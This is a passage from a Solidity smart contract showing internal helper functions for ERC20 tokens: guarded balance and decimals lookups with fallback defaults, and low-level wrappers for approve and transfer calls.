        try IERC20Like(token).balanceOf(account) returns (uint256 balance) {
            return balance;
        } catch {
            return 0;
        }
    }

    function _safeDecimals(address token) internal view returns (uint8) {
        if (token == address(0)) {
            return 18;
        }
        try IERC20Like(token).decimals() returns (uint8 d) {
            return d;
        } catch {
            return 18;
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }
}
